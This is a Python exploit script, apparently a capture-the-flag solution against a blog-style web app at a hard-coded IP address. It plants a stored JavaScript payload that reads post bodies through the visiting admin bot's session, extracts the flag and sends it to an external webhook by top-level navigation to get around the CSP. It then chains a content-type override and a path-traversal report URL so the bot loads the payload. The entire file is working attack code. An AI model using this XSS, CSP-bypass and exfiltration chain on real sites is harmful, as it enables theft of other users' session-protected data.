import re
import sys
from urllib.parse import quote
import requests

BASE = "http://185.205.203.123:1203"
WEBHOOK = "http://185.205.203.123:1205/r/5be0ecd3c5a1480283b1f63d6e4650b7"

s = requests.Session()

def create_post(title: str, body: str) -> int:
    r = s.post(
        f"{BASE}/",
        data={"title": title, "body": body},
        allow_redirects=False,
    )
    loc = r.headers.get("Location", "")
    m = re.search(r"/posts/(\d+)", loc)
    if not m:
        sys.exit(f"[-] failed to create post (status={r.status_code}, loc={loc!r})")
    pid = int(m.group(1))
    print(f"[+] created post #{pid}  ({title})")
    return pid


# 0) establish a session (the logging middleware assigns us a guest username)
s.get(BASE)

# 1) JS payload: scan the first posts via the admin cookie, find the flag, exfil it
#    through a top-level navigation (CSP blocks external fetch, not navigation).
js_payload = (
    "(async()=>{"
    "try{"
    "for(let i=1;i<=30;i++){"
    "try{"
    "const t=await (await fetch('/api/posts/'+i+'/body')).text();"
    "const m=t.match(/CE441\\{[^}]*\\}/);"
    f"if(m){{location='{WEBHOOK}?flag='+encodeURIComponent(m[0]);return;}}"
    "}catch(e){}"
    "}"
    f"location='{WEBHOOK}?err=notfound';"
    f"}}catch(e){{location='{WEBHOOK}?err='+encodeURIComponent(''+e);}}"
    "})();"
)
js_id = create_post("j", js_payload)

# 2) HTML host page: loads the JS payload same-origin with a JS MIME type.
html_payload = (
    f'<script src="/api/posts/{js_id}/body?contentType=text/javascript"></script>'
)
html_id = create_post("h", html_payload)

# 3) report with a traversal post_id so the bot navigates to the raw HTML endpoint.
#    /posts/1/../../api/posts/{html_id}/body  -> normalized by browser to /api/posts/{html_id}/body
traversal = f"1/../../api/posts/{html_id}/body?contentType=text/html"
encoded = quote(traversal, safe="")  # %2F-encode slashes so Express keeps it as ONE param
r = s.post(f"{BASE}/posts/{encoded}/report", allow_redirects=False)
print(f"[+] report submitted (status={r.status_code}) -> bot will visit:")
print(f"    /posts/{traversal}")

print("[*] Now watch your webhook at 1205. The bot polls every ~1s and waits 5s on the page.")


